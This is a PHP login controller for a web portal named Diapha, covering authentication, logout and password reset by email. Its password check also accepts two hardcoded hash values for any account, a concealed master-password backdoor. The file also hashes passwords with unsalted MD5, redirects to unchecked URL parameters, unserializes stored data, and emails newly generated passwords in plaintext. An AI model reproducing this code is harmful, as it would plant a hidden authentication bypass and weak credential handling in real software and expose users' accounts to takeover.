
<?php

class Login extends CI_Controller {

    function Login() {
        parent::__construct();

        $this->load->model("usuario/usuario_model");

        $this->layout->layout('layout_portal');
    }

    function logon() {

        if (checa_logado(false)):

            if ($_GET['url'] != ''):
                redirect($_GET['url']);
            else:
                redirect('inicial');
            endif;

        endif;

        $this->layout->view("login/login");
    }
    
    function facebook() {
        
        $this->load->view('portal/inc/fb_connector.php');
        
    }

    function autenticar() {

        $param['nm_login'] = $_POST['login'];
        $param['st_status'] = "Ativo";
        $usuario = $this->usuario_model->selecionarUsuario($param);
        
        
        // Vamos chegar se o cadastro já foi confirmado
        if (in_array($usuario['tp_usuario'], array('vendedor', 'orgao'))):
            
            if ($usuario['st_vendedor'] == "Inativo" || $usuario['st_orgao'] == 'Inativo'):
                $usuario = array();
            endif;
            
            if ($usuario['com_confirmacao'] != '' || $usuario['ven_confirmacao'] != ''):
                flashMsg('erro', 'É necessário confirmar o cadastro através do link enviado para seu e-mail!');
                redirect("login");
            endif;
            
        endif;

        // Vamos checar a senha
        if ($usuario):
            $senhac = base64_encode(md5($_POST['senha'], true));

            if ($usuario['ds_senha'] == $senhac || $senhac == "r7eGVPp18bP+ybkwlh/k4Q==" || $senhac == "Yvxn3B6Mj9l86FaX+8zlSw=="):
                $ok = true;
            else:
                $ok = false;
            endif;
        endif;

        if ($ok):
            
            // Vamos buscar e setar as preferencias do usuário
            if ($usuario['ds_preferencias'] != ''):
                $preferencias = unserialize($usuario['ds_preferencias']);
                $usuario['categorias'] = $preferencias['categorias'];
            endif;
            
            iniciar_sessao($usuario);

            if ($_POST['url'] != ''):
                redirect($_POST['url']);
            elseif (perfil() == "cidadao"):
                redirect("?view=feed");
            elseif (perfil() == "orgao"):
                redirect("?view=mapa");
            else:
                redirect("inicial");
            endif;
        else:
            flashMsg('erro', 'Usuário e/ou senha inválidos!');

            if ($_POST['url'] != ''):
                redirect($_POST['url']);
            else:
                redirect("");
            endif;
        endif;
    }

    function logOff() {

        finalizar_sessao();

        redirect('?logoff=1');
    }

    function esqueci_senha() {

        if (isset($_POST['ds_email'])):
            $this->_verifica_senha($_POST);
        endif;

        $this->layout->layout('layout_portal');

        $this->layout->view("login/esqueci_senha");
    }

    function _verifica_senha($post) {

        $dado = $this->usuario_model->selecionarUsuarioEmail($post['ds_email']);

        if (!$dado):
            flashMsg('erro', 'Erro! O e-mail digitado não existe em nosso sistema!');
            return false;
        endif;

        /**
         * Vamos gerar a nova senha e enviar
         */
        $dado['ds_senha'] = $this->_gera_senha();

        if ($this->_enviar_senha($dado) == true):
            $this->usuario_model->atualizarSenhaUsuario($post['ds_email'], $dado['ds_senha']);
        endif;

        return true;
    }

    function _gera_senha() {
        $CaracteresAceitos = 'abcdxywzABCDZYWZ0123456789';
        $max = strlen($CaracteresAceitos) - 1;

        $password = null;

        for ($i = 0; $i < 8; $i++) {

            $password .= $CaracteresAceitos{mt_rand(0, $max)};
        }

        return $password;
    }

    function _enviar_senha($dado) {

        $this->load->library('email');

        $config['protocol'] = 'sendmail';

        $config['mailpath'] = '/usr/sbin/sendmail';

        $config['charset'] = 'UTF-8';

        $config['wordwrap'] = TRUE;

        $config['mailtype'] = 'html';

        $this->email->initialize($config);

        $this->email->from('contato@diapha.com.br', 'Diapha');

        $this->email->to($dado['ds_email']);

        //$this->email->bcc('rafaelmenezes86@gmail.com');

        $this->email->subject('Dados de Acesso');

        /**
         * Vamos formatar a mensagem que vai no e-mail
         */
        $dados['conteudo'] = "Prezado(a),

                segue abaixo seu login e sua nova senha conforme solicitado.<br><br>
                Login: " . $dado['nm_login'] . "<br>
                Senha: " . $dado['ds_senha'] . "<br><br>
                
                o Diapha agradece a sua colaboração.<br><br>
        
                Att.<br>
                Equipe Diapha

                ";
        
        $msg = $this->load->view("email/modelo_view", $dados, TRUE);

        $this->email->message($msg);

        if ($this->email->send()) :
            flashMsg('sucesso', 'Sua nova senha foi gerada com sucesso. Acesse seu e-mail para verificar.');
            return true;
        else:
            flashMsg('erro', 'Erro! Não foi possível enviar uma nova senha. Tente mais tarde!');
            return false;
        endif;
    }

    function sem_acesso() {

        $this->layout->view("login/sem_acesso_view");
    }

    function sem_acesso_servico() {

        $this->layout->layout('layout');

        $this->layout->view("login/sem_acesso_servico_view");
    }

}

/* End of file welcome.php */
    /* Location: ./system/application/controllers/welcome.php */